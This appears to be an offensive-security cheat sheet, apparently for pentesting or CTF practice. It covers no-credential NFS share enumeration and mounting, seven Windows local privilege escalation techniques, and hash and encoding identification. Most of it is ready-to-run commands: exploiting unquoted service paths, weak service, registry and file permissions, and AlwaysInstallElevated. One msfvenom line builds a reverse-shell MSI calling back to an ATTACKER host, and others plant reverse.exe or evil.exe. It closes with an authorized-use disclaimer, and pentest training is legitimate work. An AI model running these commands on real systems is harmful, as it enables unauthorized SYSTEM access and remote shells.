Active Directory & Windows — Master Attack Playbook

Two phases: enumerate from the outside with no credentials, then — once you land a shell or a valid cred — pivot through lateral movement and local privilege escalation to Domain Admin. Every misconfiguration is tagged with when it's exploitable and when it isn't.

VULN IF — conditions that make it exploitable SAFE IF — conditions where it's a dead-end gotcha / caveat

NFS — often unauthenticated

rpcbind / showmount / mount 
# START rpcbind on YOUR Kali first, or showmount/mount fail
sudo systemctl start rpcbind
sudo systemctl status rpcbind        # confirm active

# list exported shares (no creds)
showmount -e $IP
nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs $IP   # peek without mounting

# mount a share
mkdir -p /tmp/nfs
sudo mount -t nfs $IP:/share_name /tmp/nfs -o nolock
sudo mount -t nfs $IP:/ /tmp/nfs -o nolock          # if root exported
ls -la /tmp/nfs/

# hunt files
find /tmp/nfs -name "*flag*" -o -name "*.txt" -o -name "*.xlsx" -o -name "id_rsa" 2>/dev/null
sudo umount /tmp/nfs
VULN IF a share is exported to * / no_root_squash → read files, or drop a SUID binary as fake-root UID for local escalation on the NFS host.
SAFE IF exports are IP-restricted and root_squash is on → your UID maps to nobody, no SUID trick.
UID mismatch? If you get permission denied, create a local user with the owner's UID (sudo useradd -u 1001 dummy; su dummy) then read the mount.

Windows local privilege escalation

Each block: how to detect, how to exploit, and the exact condition that makes it vulnerable vs a dead-end.

1 · Unquoted service path

detect / exploit 
# detect
wmic service get name,pathname,startmode | findstr /i "Program Files" | findstr /i /v '"'
sc qc WeakService
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
# exploit — drop EXE at the first space-break
copy evil.exe "C:\Program Files\Unquoted Path Service\Common.exe"
sc stop Unquotedsvc & sc start Unquotedsvc
# setup (lab): sc.exe create WeakService binPath= "C:\Program Files\Weak Folder\Service.exe" start= auto
VULN IF binPath has a space, is unquoted, runs as SYSTEM, and you can write to an earlier folder (e.g. C:\Program Files\ or the service dir) and restart it.
SAFE IF the path is quoted, has no space, or every parent folder is non-writable.

2 · Weak service permissions (SERVICE_CHANGE_CONFIG)

detect / exploit 
accesschk.exe /accepteula -uwcqv user daclsvc
sc qc daclsvc
# repoint the binary, restart
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
sc stop daclsvc & sc start daclsvc
VULN IF your user has SERVICE_CHANGE_CONFIG / WRITE_DAC on a service that runs as SYSTEM.
SAFE IF you only have query/start rights, or the service already runs in your context.

3 · Weak registry permissions (service key)

detect / exploit 
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\evil.exe /f
sc start regsvc
VULN IF you can write ImagePath under the service's registry key.
SAFE IF the key is admin-only (default).

4 · Insecure service binary / 5 · weak file perms on binary

detect / exploit 
sc qc filepermsvc
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
icacls "C:\path\service.exe"
# overwrite the binary then restart the service
copy /y reverse.exe "C:\path\service.exe"
sc stop filepermsvc & sc start filepermsvc
VULN IF icacls shows your group with (F)/(W)/(M) on the service EXE and it runs as SYSTEM.
SAFE IF only Administrators/SYSTEM can write the binary.

6 · AlwaysInstallElevated (MSI)

detect / exploit 
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i C:\PrivEsc\evil.msi
VULN IF BOTH HKCU and HKLM values equal 0x1 → any MSI installs as SYSTEM.
SAFE IF either key is 0 or missing (only one set does nothing).

7 · Weak scheduled task

detect / exploit

# overwrite the task binary, wait for it to run as SYSTEM
copy /y shell.exe C:\WeakTask\task.exe
VULN IF a task runs as SYSTEM/admin on a schedule and you can write its target binary or script.
SAFE IF the task runs as your user, or its binary path is non-writable.

Decode & identify — hashes / hex / encodings

When you find a blob and don't know what it is: identify it, then decode or route it to the right cracker.

identify first 
hashid '<blob>'
hash-identifier
nth --text '<blob>'          # name-that-hash, gives hashcat -m
hashcat --identify hash.txt
decode common encodings 
# Base64
echo 'SGVsbG8=' | base64 -d
# Hex
echo '48656c6c6f' | xxd -r -p
python3 -c "print(bytes.fromhex('48656c6c6f'))"
# URL
python3 -c "import urllib.parse,sys;print(urllib.parse.unquote('%41%42'))"
# ROT13
echo 'Uryyb' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Base32 / gzip / combos -> CyberChef "Magic" operation

Gotchas

Clock skew — sync to the DC (ntpdate $IP) before any Kerberos tool or you get KRB_AP_ERR_SKEW.
FQDN resolution — add the DC to /etc/hosts so Kerberos/LDAP by name works.
rpcbind — start it on your attacker box (sudo systemctl start rpcbind) before showmount/mount for NFS.
Lockout — check net accounts / domain policy before spraying; stay under the threshold and add delays.
Authorized use only. These techniques are for systems you own or are explicitly contracted to test.
